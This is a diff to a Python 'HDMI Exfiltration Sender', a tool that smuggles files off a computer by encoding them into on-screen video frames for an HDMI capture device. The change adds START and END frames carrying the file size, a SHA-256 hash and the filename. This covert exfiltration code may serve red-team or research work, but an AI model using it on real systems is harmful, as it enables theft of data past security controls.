@@ -9,6 +9,7 @@ import sys
 import argparse
 import ctypes
 import zlib
+import hashlib
 from ctypes import wintypes
 from common import *
 
@@ -102,6 +103,41 @@ def encode_frame(data_chunk, frame_index, total_frames, frame_type=FRAME_TYPE_DA
 
     return img
 
+
+def build_start_metadata(filename, file_data):
+    """Build START frame payload containing transfer metadata.
+
+    Layout: [4B file_size][32B SHA-256][2B filename_len][NB filename]
+    """
+    sha256_hash = hashlib.sha256(file_data).digest()  # 32 bytes
+    filename_bytes = filename.encode('utf-8')
+    metadata = struct.pack('>I', len(file_data))        # 4B file_size
+    metadata += sha256_hash                              # 32B SHA-256
+    metadata += struct.pack('>H', len(filename_bytes))   # 2B filename_len
+    metadata += filename_bytes                           # NB filename
+    return metadata
+
+
+def encode_start_frame(filename, file_data, total_data_frames):
+    """Encode a START frame with file metadata.
+
+    The START frame uses frame_type=FRAME_TYPE_START, frame_index=0,
+    total_frames=total_data_frames (the number of DATA frames to follow).
+    """
+    metadata = build_start_metadata(filename, file_data)
+    return encode_frame(metadata, 0, total_data_frames, frame_type=FRAME_TYPE_START)
+
+
+def encode_end_frame(total_data_frames):
+    """Encode an END frame signaling transfer completion.
+
+    The END frame uses frame_type=FRAME_TYPE_END, carries no meaningful payload.
+    """
+    # END frame payload is empty (just a signal)
+    return encode_frame(b'\x00', total_data_frames, total_data_frames,
+                        frame_type=FRAME_TYPE_END)
+
+
 def main():
     parser = argparse.ArgumentParser(description="HDMI Exfiltration Sender")
     parser.add_argument("input_path", help="File or directory to send")
@@ -132,22 +168,19 @@ def main():
     with open(filepath, 'rb') as f:
         file_data = f.read()
 
-    # Prepend filename metadata
-    # Format: [4 bytes name_len][name_bytes][file_content]
     filename = os.path.basename(filepath)
-    filename_bytes = filename.encode('utf-8')
-    metadata_header = struct.pack('>I', len(filename_bytes)) + filename_bytes
-    
-    file_data = metadata_header + file_data
+
+    # file_data is the raw file content (no metadata prefix)
     file_size = len(file_data)
-    
+
     print(f"Sending {filepath} as '{filename}'")
     print(f"Total Data Size: {file_size} bytes")
+    print(f"SHA-256: {hashlib.sha256(file_data).hexdigest()}")
     print(f"Resolution: {WIDTH}x{HEIGHT}, Block Size: {BLOCK_SIZE}")
     print(f"Bytes per frame: {BYTES_PER_FRAME}")
-    
+
     total_frames = math.ceil(file_size / BYTES_PER_FRAME)
-    print(f"Total frames needed: {total_frames}")
+    print(f"Total DATA frames needed: {total_frames}")
 
     delay = int(1000 / fps)
     print(f"Target FPS: {fps} (Delay: {delay}ms)")
@@ -189,51 +222,67 @@ def main():
     cv2.imshow('HDMI Exfil Sender', create_calibration_frame())
     cv2.waitKey(0)
 
-    # Transmission loop
+    # --- Transmission loop ---
     start_time = time.time()
     interrupted = False
     paused = False
-    
+
+    # Phase 1: Send START frame
+    start_frame = encode_start_frame(filename, file_data, total_frames)
+    for _ in range(redundancy):
+        cv2.imshow('HDMI Exfil Sender', start_frame)
+        key = cv2.waitKey(delay) & 0xFF
+        if key == 27:
+            paused = True
+            break
+
+    # Phase 2: Send DATA frames
     i = 0
     while i < total_frames:
         if paused:
             # Show Pause Screen
             pause_img = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)
-            cv2.putText(pause_img, "PAUSED", (WIDTH//2 - 200, HEIGHT//2), cv2.FONT_HERSHEY_SIMPLEX, 4, (0, 165, 255), 4) # Orange
-            cv2.putText(pause_img, "Press 'r' to RESUME, 'q' or ESC to QUIT", (WIDTH//2 - 400, HEIGHT//2 + 100), cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
+            cv2.putText(pause_img, "PAUSED", (WIDTH//2 - 200, HEIGHT//2),
+                        cv2.FONT_HERSHEY_SIMPLEX, 4, (0, 165, 255), 4)
+            cv2.putText(pause_img, "Press 'r' to RESUME, 'q' or ESC to QUIT",
+                        (WIDTH//2 - 400, HEIGHT//2 + 100),
+                        cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 255, 255), 2)
             cv2.imshow('HDMI Exfil Sender', pause_img)
-            
+
             key = cv2.waitKey(100) & 0xFF
             if key == ord('r'):
                 paused = False
                 print("\nResuming transmission...")
-            elif key == 27 or key == ord('q'): # ESC or q
+            elif key == 27 or key == ord('q'):
                 interrupted = True
                 break
             continue
 
-        # Normal Transmission
         start_byte = i * BYTES_PER_FRAME
         end_byte = min((i + 1) * BYTES_PER_FRAME, file_size)
         chunk = file_data[start_byte:end_byte]
-        
-        frame = encode_frame(chunk, i, total_frames)
-        
-        # Redundancy loop
+
+        frame = encode_frame(chunk, i, total_frames)  # frame_type defaults to DATA
+
         for _ in range(redundancy):
             cv2.imshow('HDMI Exfil Sender', frame)
-            
-            # Wait to match target FPS
             key = cv2.waitKey(delay) & 0xFF
-            if key == 27: # ESC to PAUSE
+            if key == 27:
                 paused = True
                 print(f"\nPaused at frame {i}/{total_frames}")
-                break # Break redundancy loop to handle pause
-        
+                break
+
         if paused:
             continue
-            
+
         i += 1
+
+    # Phase 3: Send END frame (if not interrupted)
+    if not interrupted:
+        end_frame = encode_end_frame(total_frames)
+        for _ in range(redundancy):
+            cv2.imshow('HDMI Exfil Sender', end_frame)
+            cv2.waitKey(delay)
             
     end_time = time.time()
     duration = end_time - start_time
